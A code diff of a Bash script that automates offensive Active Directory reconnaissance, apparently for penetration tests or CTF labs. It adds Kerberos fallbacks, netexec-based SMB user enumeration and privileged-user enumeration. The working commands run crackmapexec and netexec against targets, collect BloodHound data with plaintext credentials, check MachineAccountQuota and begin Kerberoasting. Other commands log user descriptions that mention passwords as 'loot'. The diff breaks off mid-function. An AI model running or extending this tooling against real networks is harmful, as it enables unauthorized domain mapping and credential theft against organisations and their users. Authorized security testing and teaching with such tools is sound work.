@@ -42,6 +42,8 @@ START_TIME=$(date +%s)
 
 DEFAULT_TARGET="127.0.0.1"
 TARGET=""
+TARGET_IPV4=""
+TARGET_FQDN=""
 DOMAIN_CONTROLLER=""
 ENABLE_VHOST=false
 ENABLE_KERB_ENUM=false
@@ -81,6 +83,7 @@ KERB_DETECTED=false
 KERB_ENUM_DONE=false
 KERB_REALM=""
 USERS_FILE=""
+PRIV_USERS_FILE=""
 WMI_AUTH_OK=false
 PSEXEC_AUTH_OK=false
 DC_AUTH_OK=0
@@ -248,9 +251,29 @@ ORIGINAL_HOSTNAME=""
 resolve_hostname_to_ip() {
     local input="$1"
     local resolved_ip
-
-    # If it's already an IP, return
+    info "Attempting to Resolve: '$input'"
+    
+    # If it's an IP address
     if [[ "$input" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        #TARGET="$input"
+        info "   [DEBUG] IPV4 Detected"
+        # First attempt: getent (respects /etc/hosts)
+        ORIGINAL_HOSTNAME=$(getent hosts "$input" | awk '{print $2}' | head -n 1 || echo "")
+        info "   [DEBUG] ORIGINAL_HOSTNAME: '$ORIGINAL_HOSTNAME'"
+        # Fallback to dig if getent fails
+        if [ -z "$ORIGINAL_HOSTNAME" ]; then
+            ORIGINAL_HOSTNAME=$(dig +short -x "$input" | sed 's/\.$//' | head -n 1)
+        fi
+
+        if [ -n "$ORIGINAL_HOSTNAME" ]; then
+            info "Reverse DNS for ${CYAN}$TARGET${RESET} resolved to: ${GREEN}$ORIGINAL_HOSTNAME${RESET}"
+            echo "$input $ORIGINAL_HOSTNAME" >> "$HOSTS_FILE"
+            echo "$ORIGINAL_HOSTNAME" >> "$DISCOVERED_HOSTS"
+        else
+            notify "No reverse DNS entry found for IP: ${YELLOW}$TARGET${RESET}"
+        fi
+        TARGET_IPV4="$input"
+        notify "Set TARGT_IPV4 to:  '$TARGET_IPV4'"
         return 0
     fi
 
@@ -261,12 +284,16 @@ resolve_hostname_to_ip() {
         error "Could not resolve hostname: $input"
         exit 1
     fi
-
+    
     info "Resolved hostname ${CYAN}$input${RESET} to IP: ${GREEN}$resolved_ip${RESET}"
 
     # Save original hostname for Kerberos/SPN logic if needed
     ORIGINAL_HOSTNAME="$input"
+    TARGET_FQDN="$ORIGINAL_HOSTNAME"
     TARGET="$resolved_ip"
+    TARGET_IPV4="$resolved_ip"
+    notify "Set TARGET_FQDN to: '$TARGET_FQDN'"
+    notify "Set TARGT_IPV4 to:  '$TARGET_IPV4'"
 }
 
 
@@ -275,7 +302,7 @@ dc_auth_check() {
     local pass="$2"
     local domain="$3"
     local dc="$4"
-
+    info "Starting DC Auth Check..."
     ########################################
     # Tool Resolution
     ########################################
@@ -292,13 +319,28 @@ dc_auth_check() {
     ########################################
     # Credential Validation Only
     ########################################
-    OUT=$($LDAP_TOOL ldap "$dc" \
-        -u "$user" \
-        -p "$pass" \
-        -d "$domain" \
-        --no-bruteforce \
-        --continue-on-success \
+    if [[ "$NTLM_ENABLED" == true ]]; then
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$LDAP_TOOL ldap '$dc' -u '$user' -p '$pass' -d '$domain' --no-bruteforce --continue-on-success${RESET}"
+        OUT=$($LDAP_TOOL ldap "$dc" \
+            -u "$user" \
+            -p "$pass" \
+            -d "$domain" \
+            --no-bruteforce \
+            --continue-on-success \
         2>&1)
+    else
+        info "   - NTLM Disabled. Using Kerberos..."
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$LDAP_TOOL ldap '$dc' -u '$user' -p '$pass' -d '$domain' -k --no-bruteforce --continue-on-success${RESET}"
+        OUT=$($LDAP_TOOL ldap "$dc" \
+            -u "$user" \
+            -p "$pass" \
+            -d "$domain" -k \
+            --no-bruteforce \
+            --continue-on-success \
+        2>&1)
+    fi
 
     ########################################
     # Success Detection
@@ -342,20 +384,20 @@ gather_bloodhound() {
     echo "   - Pass:     $AUTH_PASS"
     echo "   - Domain:   $LDAP_DOMAIN"
     echo "   - DC:       $LDAP_DOMAIN"
-    echo "   - DC IP:    $TARGET"
+    echo "   - DC IP:    $TARGET_IPV4"
     #echo "   - Output:   $BH_OUT_DIR"
-    echo "   - ns        $TARGET"
+    echo "   - ns        $TARGET_IPV4"
     echo 
     info "Gathering domain info via Bloodhound (May Take Some Time)..."
     echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}bloodhound-python -u '$AUTH_USER' -p '$AUTH_PASS' -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET --auth-method ntlm -c All --zip ${RESET}"
+    echo -e "        ${GREEN}bloodhound-python -u '$AUTH_USER' -p '$AUTH_PASS' -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method ntlm -c All --zip ${RESET}"
     
     # ---- Capture output while displaying it ----
     BH_LOG=$(mktemp)
     
-    #bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET --auth-method ntlm -c All --zip 
+    #bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method ntlm -c All --zip 
     
-    bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET --auth-method ntlm \
+    bloodhound-python -u "$AUTH_USER" -p "$AUTH_PASS" -d $LDAP_DOMAIN -dc $LDAP_DOMAIN -ns $TARGET_IPV4 --auth-method ntlm \
         -c All \
         --zip \
         2>&1 | tee "$BH_LOG"
@@ -423,7 +465,7 @@ extract_ssl_info() {
         if [ "$port" -eq 636 ]; then
             # Try to infer the base domain from SAN entries (e.g. scrm.local)
             DOMAIN_CONTROLLER=$(echo "$SAN" | grep -m1 -Eo '[a-zA-Z0-9.-]+\.[a-z]{2,}$')
-            echo "$TARGET $DOMAIN_CONTROLLER" >> "$HOSTS_FILE"
+            echo "$TARGET_IPV4 $DOMAIN_CONTROLLER" >> "$HOSTS_FILE"
             
             if [ -n "$DOMAIN_CONTROLLER" ]; then
                note "Detected Domain Controller from SAN: ${GREEN}$DOMAIN_CONTROLLER${RESET}"
@@ -456,11 +498,26 @@ ensure_krb5_conf_from_ldap() {
     info "Validating krb5.conf for realm: ${REALM_UPPER}, ${DC_Host} | ${DC_IP}"
 
     # Check if krb5.conf already has the realm
+    #if grep -qi "default_realm *= *$REALM_UPPER" "$KRB5_FILE" && \
+    #   grep -q "^\s*$REALM_UPPER\s*=" "$KRB5_FILE"; then
+    #    success "krb5.conf already configured for realm ${REALM_UPPER}"
+    #    return 0
+    #fi
+    # Check if realm is already defined in krb5.conf
     if grep -qi "default_realm *= *$REALM_UPPER" "$KRB5_FILE" && \
        grep -q "^\s*$REALM_UPPER\s*=" "$KRB5_FILE"; then
-        success "krb5.conf already configured for realm ${REALM_UPPER}"
-        return 0
+
+        # Extract current KDC IP for this realm
+        CURRENT_KDC=$(awk "/^\s*\[$REALM_UPPER\]/ {found=1} found && /kdc\s*=/ {gsub(/[ \t]*kdc[ \t]*=[ \t]*/, \"\", \$0); print; exit}" RS= "$KRB5_FILE")
+
+        if [ "$CURRENT_KDC" = "$DC_IP" ]; then
+            success "krb5.conf already configured correctly for realm ${REALM_UPPER} with KDC ${GREEN}$DC_IP${RESET}"
+            return 0
+        else
+            notify "krb5.conf realm exists but KDC IP has changed: ${YELLOW}${CURRENT_KDC} → ${DC_IP}${RESET}"
+        fi
     fi
+    
 
     backup_file="${KRB5_FILE}.bak.$(date +%s)"
     sudo cp "$KRB5_FILE" "$backup_file"
@@ -512,10 +569,10 @@ cme_enum_users() {
 
     info "Enumerating SMB users via crackmapexec ($AUTH_LABEL)..."
     echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}crackmapexec smb $TARGET $CME_ARGS --users${RESET}"
+    echo -e "        ${GREEN}crackmapexec smb $TARGET_IPV4 $CME_ARGS --users${RESET}"
 
     # Capture full CME output (stdout + stderr)
-    RAW_CME=$(crackmapexec smb "$TARGET" $CME_ARGS --users 2>&1)
+    RAW_CME=$(crackmapexec smb "$TARGET_IPV4" $CME_ARGS --users 2>&1)
 
     # --- 1. Hard failure: no auth at all ---
     if echo "$RAW_CME" | grep -qiE '\[-\].*(STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|ACCESS_DENIED)'; then
@@ -575,7 +632,7 @@ cme_enum_users() {
         if [[ -n "$desc" ]]; then
             if echo "$desc" | grep -Ei 'pass|pwd|creds|password|secret|key|cont|contractor|temp' >/dev/null; then
                 echo -e "          ${RED}⚠ Description:${RESET} $desc"
-                echo -e "[LOOT] $TARGET SMB DESC $user : $desc" >> smb_user_descriptions.txt
+                echo -e "[LOOT] $TARGET_IPV4 SMB DESC $user : $desc" >> smb_user_descriptions.txt
                 FOUND_DESC=1
             else
                 echo -e "          ℹ Description: $desc"
@@ -584,10 +641,92 @@ cme_enum_users() {
     done <<< "$OUTPUT"
 
     # Save clean user list
-    echo "$OUTPUT" | cut -d'|' -f1 > "users_smb_$TARGET.txt"
-    success "Saved user list to users_smb_$TARGET.txt"
+    echo "$OUTPUT" | cut -d'|' -f1 > "users_smb_$TARGET_IPV4.txt"
+    success "Saved user list to users_smb_$TARGET_IPV4.txt"
 
     if [ "$FOUND_DESC" -eq 1 ]; then
+        success "Suspicious descriptions logged to smb_user_descriptions.txt"
+    fi
+
+    return 0
+}
+
+nxc_enum_users() {
+    local AUTH_LABEL="$1"
+    local NXC_ARGS="$2"
+    local FOUND_DESC=0
+    local RAW_OUT USERS
+
+    command -v netexec >/dev/null 2>&1 || return 1
+
+    info "Enumerating SMB users via netexec ($AUTH_LABEL)..."
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}netexec smb $TARGET_IPV4 $NXC_ARGS --users${RESET}"
+
+    RAW_OUT=$(netexec smb "$TARGET_IPV4" $NXC_ARGS --users 2>&1)
+
+    # --- 1. Hard authentication failure ---
+    if echo "$RAW_OUT" | grep -qiE 'STATUS_LOGON_FAILURE|ACCESS_DENIED|KDC_ERR|LOGON_FAILURE'; then
+        warn "SMB authentication failed ($AUTH_LABEL)"
+        return 1
+    fi
+
+    # --- 2. Auth OK but enumeration not allowed ---
+    if echo "$RAW_OUT" | grep -qiE 'Error enumerating|not permitted'; then
+        notify "SMB authentication successful ($AUTH_LABEL), but user enumeration is restricted"
+        SMB_AUTH_OK=true
+        return 0
+    fi
+    
+    if echo "$RAW_OUT" | grep -qP '\[\+\]'; then
+        notify "SMB authentication successful ($AUTH_LABEL)"
+    fi
+
+    # --- 3. Parse users table (skip headers & footer) ---
+    USERS=$(echo "$RAW_OUT" | awk '
+        $1 == "SMB" && $5 !~ /^-Username-$/ && $6 ~ /^[0-9]{4}-[0-9]{2}-[0-9]{2}|<never>$/ {
+            user=$5
+            desc=""
+            if (NF > 7) {
+                for (i=8; i<=NF; i++) {
+                    desc = desc $i " "
+                }
+            }
+            gsub(/[[:space:]]+$/, "", desc)
+            print user "|" desc
+        }
+    ' | sort -u)
+
+    # --- 4. No users parsed ---
+    if [[ -z "$USERS" ]]; then
+        notify "SMB authentication successful ($AUTH_LABEL), but no users returned"
+        return 0
+    fi
+
+    # --- 5. Enumeration succeeded ---
+    high_risk "SMB user enumeration successful ($AUTH_LABEL)"
+    SMB_AUTH_OK=true
+    echo -e "    ${YELLOW}Users Discovered:${RESET}"
+
+    while IFS="|" read -r user desc; do
+        echo -e "      - ${BYELLOW}$user${RESET}"
+
+        if [[ -n "$desc" ]]; then
+            if echo "$desc" | grep -Ei 'pass|pwd|creds|password|secret|key|temp|contract' >/dev/null; then
+                echo -e "          ${RED}⚠ Description:${RESET} $desc"
+                echo "[LOOT] $TARGET_IPV4 SMB DESC $user : $desc" >> smb_user_descriptions.txt
+                FOUND_DESC=1
+            else
+                echo -e "          ℹ Description: $desc"
+            fi
+        fi
+    done <<< "$USERS"
+
+    # --- 6. Save output ---
+    echo "$USERS" | cut -d'|' -f1 > "users_smb_$TARGET_IPV4.txt"
+    success "Saved user list to users_smb_$TARGET_IPV4.txt"
+
+    if [[ "$FOUND_DESC" -eq 1 ]]; then
         success "Suspicious descriptions logged to smb_user_descriptions.txt"
     fi
 
@@ -654,7 +793,7 @@ ldap_enum() {
 
     success "LDAP domain identified: $LDAP_DOMAIN"
     note "Base DN: $LDAP_BASE_DN"
-    echo "$TARGET $LDAP_DOMAIN" >> "$HOSTS_FILE"
+    echo "$TARGET_IPV4 $LDAP_DOMAIN" >> "$HOSTS_FILE"
 
     ########################################
     # 2. Bind Capability Detection (FIXED)
@@ -662,8 +801,8 @@ ldap_enum() {
     if [[ "$USE_AUTH" != "auth" ]]; then
         info "Testing Anonymous LDAP bind"
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET --anonymous${RESET}"
-        ANON_OUT=$($LDAP_TOOL ldap "$TARGET" --anonymous 2>&1)
+	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 --anonymous${RESET}"
+        ANON_OUT=$($LDAP_TOOL ldap "$TARGET_IPV4" --anonymous 2>&1)
 
         if echo "$ANON_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
             LDAP_ANON_BIND=true
@@ -676,10 +815,9 @@ ldap_enum() {
     if [[ "$USE_AUTH" != "auth" ]]; then
         info "Testing Guest LDAP bind (${LDAP_DOMAIN}\\Guest)"
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET -d $LDAP_DOMAIN -u 'guest' -p ''${RESET}"
-        #GUEST_OUT=$($LDAP_TOOL ldap "$TARGET" -d "$LDAP_DOMAIN" -u guest -p "" 2>&1)
-        GUEST_OUT=$($LDAP_TOOL ldap "$TARGET" -d "$LDAP_DOMAIN" -u guest -p "" 2>&1 | tr -d '\000')
-
+	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 -d $LDAP_DOMAIN -u 'guest' -p ''${RESET}"
+        #GUEST_OUT=$($LDAP_TOOL ldap "$TARGET_IPV4" -d "$LDAP_DOMAIN" -u guest -p "" 2>&1)
+        GUEST_OUT=$($LDAP_TOOL ldap "$TARGET_IPV4" -d "$LDAP_DOMAIN" -u guest -p "" 2>&1 | tr -d '\000')
 
         if echo "$GUEST_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
             LDAP_GUEST_BIND=true
@@ -688,21 +826,36 @@ ldap_enum() {
             warn "Guest LDAP bind denied"
         fi
     fi
-
-    if [[ "$USE_AUTH" == "auth" && "$CREDS_PROVIDED" == true ]]; then
+    
+    #VERBOSE DEBUG
+    #echo "[DEBUG] NTLM_ENABLED='$NTLM_ENABLED'"
+    #echo "[DEBUG] USE_AUTH='$USE_AUTH'"
+    #echo "[DEBUG] CREDS_PROVIDED='$CREDS_PROVIDED'"
+    if [[ "$USE_AUTH" == "auth" && "$CREDS_PROVIDED" == true && $NTLM_ENABLED == true ]]; then
         info "Testing Authenticated LDAP bind ($AUTH_USER|$AUTH_PASS)"
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET -d $LDAP_DOMAIN -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
-        AUTH_OUT=$($LDAP_TOOL ldap "$TARGET" -d "$LDAP_DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" 2>&1)
+	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 -d $LDAP_DOMAIN -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+        AUTH_OUT=$($LDAP_TOOL ldap "$TARGET_IPV4" -d "$LDAP_DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" 2>&1)
 
         if echo "$AUTH_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
             LDAP_AUTH_BIND=true
-            success "Authenticated LDAP bind successful"
+            success "Authenticated LDAP bind using NTLM successful"
         else
-            warn "Authenticated LDAP bind failed"
+            warn "Authenticated LDAP bind using NTLM failed"
+        fi
+    elif [[ "$USE_AUTH" == "auth" && "$CREDS_PROVIDED" == true ]]; then
+        info "Testing Kerberos Authenticated LDAP bind ($AUTH_USER|$AUTH_PASS) - NTLM Not Supported"
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+	echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 -d $LDAP_DOMAIN -u '$AUTH_USER' -p '$AUTH_PASS' -k${RESET}"
+	AUTH_OUT=$(netexec ldap "$TARGET_IPV4" -d "$LDAP_DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" -k 2>&1)
+	if echo "$AUTH_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
+            LDAP_AUTH_BIND=true
+            success "Authenticated LDAP bind successful using Kerberos"
+        else
+            warn "Authenticated LDAP bind using Kerberos failed! "
         fi
     fi
-    echo
+
     ########################################
     # 3. Select Best Available Bind
     ########################################
@@ -723,29 +876,47 @@ ldap_enum() {
         set -e
         return
     fi
-    echo
-    success "Using LDAP bind type: ${BLUE}$LDAP_BIND_TYPE${RESET}"
+    if [[ $NTLM_ENABLED == true ]]; then
+        success "Using NTLM LDAP bind type: ${BLUE}$LDAP_BIND_TYPE${RESET}"
+    else
+        success "Using Kerberos LDAP bind type: ${BLUE}$LDAP_BIND_TYPE${RESET}"
+    fi
     echo
     ########################################
-    # 4. Enumerate Users (FIXED FOR REAL)
+    # 4a. Enumerate ALL Users
     ########################################
     DATE_TAG=$(date +"%Y%m%d_%H%M%S")
-    LDAP_USERS_TMP="users_${TARGET}_${DATE_TAG}.txt"
-    LDAP_USERS_CSV="users_${TARGET}_${DATE_TAG}.csv"
-    info "Enumerating users"
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} --users${RESET}"
-    mapfile -t LDAP_USERS < <(
-        $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" --users 2>/dev/null \
-            | sed -nE '
-                /^\s*LDAP/ {
-                    /\[|\]|-Username-|Enumerated/ b
-                    s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
-                }
-            ' \
-            | sort -u
-    )
-
+    LDAP_USERS_TMP="users_${TARGET_IPV4}_${DATE_TAG}.txt"
+    LDAP_USERS_CSV="users_${TARGET_IPV4}_${DATE_TAG}.csv"
+    info "Enumerating Users via LDAP..."
+    if [[ "$NTLM_ENABLED" == true ]]; then
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --users${RESET}"
+        mapfile -t LDAP_USERS < <(
+            $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --users 2>/dev/null \
+                | sed -nE '
+                    /^\s*LDAP/ {
+                        /\[|\]|-Username-|Enumerated/ b
+                        s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
+                    }
+                ' \
+                | sort -u
+        )
+    else
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --users${RESET}"
+        mapfile -t LDAP_USERS < <(
+            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --users 2>/dev/null \
+                | awk '
+                    $1 == "LDAP" && $5 != "-Username-" && $5 != "" && $5 !~ /^\[|\]/ {
+                        print $5
+                    }
+                ' \
+                | grep -v '^$' \
+                | sort -u
+        )
+    fi
+    #Save Findings... if any
     if [[ ${#LDAP_USERS[@]} -gt 0 ]]; then
         printf "%s\n" "${LDAP_USERS[@]}" > "$LDAP_USERS_TMP"
         
@@ -769,24 +940,103 @@ ldap_enum() {
     fi
     echo
     ########################################
+    # 4b. Enumerate ADMIN Users
+    ########################################
+    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
+    LDAP_PRIV_USERS_TMP="admin_users_${TARGET_IPV4}_${DATE_TAG}.txt"
+    LDAP_PRIV_USERS_CSV="admin_users_${TARGET_IPV4}_${DATE_TAG}.csv"
+    info "Enumerating Admin/Privileged Users via LDAP..."
+    if [[ "$NTLM_ENABLED" == true ]]; then
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --admin-count${RESET}"
+        mapfile -t LDAP_ADMIN_USERS < <(
+            $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --admin-count 2>/dev/null \
+                | sed -nE '
+                    /^\s*LDAP/ {
+                        /\[|\]|-Username-|Enumerated/ b
+                        s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
+                    }
+                ' \
+                | sort -u
+        )
+    else
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --admin-count${RESET}"
+        mapfile -t LDAP_ADMIN_USERS < <(
+            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --admin-count 2>/dev/null \
+                | awk '
+                    $1 == "LDAP" &&
+                    $5 != "" &&
+                    $5 !~ /^\[|\]/ {
+                        print $5
+                    }
+                ' \
+                | sort -u
+        )
+    fi
+
+    if [[ ${#LDAP_ADMIN_USERS[@]} -gt 0 ]]; then
+        printf "%s\n" "${LDAP_ADMIN_USERS[@]}" > "$LDAP_PRIV_USERS_TMP"
+        
+        # Write all users to CSV
+        {
+            echo "Username"
+            printf "%s\n" "${LDAP_ADMIN_USERS[@]}"
+        } > "$LDAP_PRIV_USERS_CSV"
+        success "All Admin Users saved to CSV: ${BLUE}$LDAP_PRIV_USERS_CSV${RESET}"
+        
+        if [[ -z "${PRIV_USERS_FILE:-}" ]]; then
+            PRIV_USERS_FILE="$LDAP_PRIV_USERS_TMP"
+            export PRIV_USERS_FILE
+            success "All Admin Users saved to TXT: ${BLUE}$PRIV_USERS_FILE${RESET}"
+        fi
+        
+        # Display only first 25 users
+        print_section "Admin Users Discovered (first 25 shown):" "${LDAP_ADMIN_USERS[@]:0:25}"
+    else
+        warn "No admin/privileged users parsed from LDAP output"
+    fi
+    echo
+    ########################################
     # 5. Enumerate Groups (LIMITED DISPLAY + CSV)
     ########################################
     info "Enumerating groups"
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} --groups${RESET}"
+    
     # Parse groups with membercount
-    mapfile -t LDAP_GROUPS_RAW < <(
-        $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" --groups 2>/dev/null \
-            | sed -nE '
-                /^\s*LDAP.*membercount:/ {
-                    s/^.*AUTHORITY[[:space:]]+//
-                    s/[[:space:]]+membercount:/|/g
-                    s/^[[:space:]]+|[[:space:]]+$//g
-                    p
-                }
-            ' \
-            | sort -u
-    )
+    if [[ "$NTLM_ENABLED" == true ]]; then
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --groups${RESET}"
+        mapfile -t LDAP_GROUPS_RAW < <(
+            $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --groups 2>/dev/null \
+                | sed -nE '
+                    /^\s*LDAP.*membercount:/ {
+                        s/^.*AUTHORITY[[:space:]]+//
+                        s/[[:space:]]+membercount:/|/g
+                        s/^[[:space:]]+|[[:space:]]+$//g
+                        p
+                    }
+                ' \
+                | sort -u
+        )
+    else
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --groups${RESET}"
+        mapfile -t LDAP_GROUPS_RAW < <(
+            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --groups 2>/dev/null \
+                | awk '
+                    /^\s*LDAP/ && $6 ~ /^[1-9][0-9]*$/ {
+                        # Reconstruct: GroupName|MemberCount|Description
+                        group = $5
+                        member_count = $6
+                        # Capture everything after the member count (description)
+                        $1=""; $2=""; $3=""; $4=""; $5=""; $6=""
+                        desc = substr($0, index($0, $7))
+                        gsub(/^[[:space:]]+|[[:space:]]+$/, "", desc)
+                        printf "%s|%s|%s\n", group, member_count, desc
+                    }
+                ' | sort -u
+        )
+    fi
 
     # Separate names and counts for display
     LDAP_GROUPS=()
@@ -817,15 +1067,25 @@ ldap_enum() {
     info "Enumerating computers"
     DATE_TAG=$(date +"%Y%m%d_%H%M%S")
     LDAP_COMPUTERS_CSV="computers_${TARGET}_${DATE_TAG}.csv"
-
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} --computers${RESET}"
-    mapfile -t LDAP_COMPUTERS < <(
-        $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" --computers 2>/dev/null \
-            | awk '{print $NF}' \
-            | grep '\$$' \
-            | sort -u
-    )
+    if [[ "$NTLM_ENABLED" == true ]]; then
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} --computers${RESET}"
+        mapfile -t LDAP_COMPUTERS < <(
+            $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" --computers 2>/dev/null \
+                | awk '{print $NF}' \
+                | grep '\$$' \
+                | sort -u
+        )
+    else
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k --computers${RESET}"
+        mapfile -t LDAP_COMPUTERS < <(
+            netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k --computers 2>/dev/null \
+                | awk '{print $NF}' \
+                | grep '\$$' \
+                | sort -u
+        )
+    fi
     
     if [[ ${#LDAP_COMPUTERS[@]} -gt 0 ]]; then
         # Write ALL computers to CSV
@@ -847,14 +1107,25 @@ ldap_enum() {
     # 7. MachineAccountQuota
     ########################################
     info "Enumerating MachineAccountQuota"
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} -M maq${RESET}"
-    MAQ_VALUE=$(
-        timeout 15 $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" -M maq 2>/dev/null \
-            | tr -d '\000' \
-            | awk -F': ' '/MachineAccountQuota/ {print $2}' \
-            | tail -n1
-    )
+    if [[ "$NTLM_ENABLED" == true ]]; then
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -M maq${RESET}"
+        MAQ_VALUE=$(
+            timeout 15 $LDAP_TOOL ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -M maq 2>/dev/null \
+                | tr -d '\000' \
+                | awk -F': ' '/MachineAccountQuota/ {print $2}' \
+                | tail -n1
+        )
+    else
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}netexec ldap $TARGET_IPV4 ${LDAP_EXEC_ARGS[@]} -k -M maq${RESET}"
+        MAQ_VALUE=$(
+            timeout 15 netexec ldap "$TARGET_IPV4" "${LDAP_EXEC_ARGS[@]}" -k -M maq 2>/dev/null \
+                | tr -d '\000' \
+                | awk -F': ' '/MachineAccountQuota/ {print $2}' \
+                | tail -n1
+        )
+    fi
 
     if [[ -n "$MAQ_VALUE" && "$MAQ_VALUE" =~ ^[0-9]+$ ]]; then
         if (( MAQ_VALUE > 0 )); then
@@ -874,10 +1145,16 @@ ldap_enum() {
     ########################################
     info "Enumerating Kerberoastable accounts"
     DATE_TAG=$(date +"%Y%m%d_%H%M%S")
-    KERBEROAST_OUT="kerberoast_${TARGET}_${DATE_TAG}.txt"
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} --kerberoasting $KERBEROAST_OUT${RESET}"
-    timeout 15 $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" --kerberoasting "$KERBEROAST_OUT" 2>/dev/null
+    KERBEROAST_OUT="kerberoast_${TARGET_IPV4}_${DATE_TAG}.txt"
+    if [[ "$NTLM_ENABLED" == true ]]; then
